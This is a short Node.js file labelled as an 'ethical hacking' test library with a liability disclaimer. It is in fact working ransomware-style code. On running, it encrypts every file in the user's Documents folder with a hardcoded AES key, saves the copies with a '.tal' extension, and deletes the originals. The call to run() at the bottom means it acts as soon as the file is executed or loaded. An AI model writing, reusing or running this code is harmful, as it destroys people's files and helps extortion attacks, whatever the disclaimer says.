//*************************************************************** */
//This is a test library for ethical hacking/penetration testing
//I take no responsibility on any illegal or misuse of this package and code
//*************************************************************** */

const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');






const encrypt = (text, key) => {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(key), iv);
    let encrypted = cipher.update(text, 'utf8', 'base64');
    encrypted += cipher.final('base64');
    return `${iv.toString('base64')}:${encrypted}`;
}



const run = () => {

    let contentToAppend = "";
    const desktopPath = path.join(os.homedir(), 'Desktop', 'textfile.txt');


    const secretKey = 'b63cb0e327384374bc1d6f7cb5611f8a';

    const directoryPath = path.join(os.homedir(), 'Documents');

fs.readdir(directoryPath, (err, files) => {
    if (err) {
      //console.error('Error reading directory:', err);
      return;
    }
  
    files.forEach(file => {
      const filePath = path.join(directoryPath, file);
  
      fs.readFile(filePath, (err, data) => {
        if (err) {
            
         // console.error(`Error reading file ${file}:`, err);

          contentToAppend = `Error saving encrypted file ${file}.tal: ${err}\n`;

            fs.appendFile(desktopPath, contentToAppend, (err) => {
            if (err) {
                //console.error('Error appending to file:', err);
            } else {
                console.log('Content appended to file successfully.');
            }
            });

          return;
        }
  
        //console.log(`Binary data of file ${file}:`, data);

        const encryptedData = encrypt(data, secretKey);



        const encryptedFilePath = path.join(directoryPath, `${file}.tal`);
        fs.writeFile(encryptedFilePath, encryptedData, (err) => {
            if (err) {
                //console.error(`Error saving encrypted file ${file}.tal:`, err);


               
                contentToAppend = `Error saving encrypted file ${file}.tal: ${err}`;

                fs.appendFile(desktopPath, contentToAppend, (err) => {
                if (err) {
                    //console.error('Error appending to file:', err);
                } else {
                    console.log('Content appended to file successfully.');
                }
                });

            } else {
                console.log(`File ${file} encrypted and saved as ${file}.tal`);
                const deletePath = path.join(directoryPath, `${file}`);
                fs.unlink(deletePath, (err) => {
                    if (err) {
                    //console.error('Error deleting file:', err);

                    contentToAppend = `Error saving encrypted file ${file}.tal: ${err}`;

                    fs.appendFile(desktopPath, contentToAppend, (err) => {
                    if (err) {
                        //console.error('Error appending to file:', err);
                    } else {
                        console.log('Content appended to file successfully.');
                    }
                    });
                    } else {
                    console.log('File deleted successfully!');
                    }
                });
            }
        });


      });
    });
  });
}


run();






  
  
  
  
  
  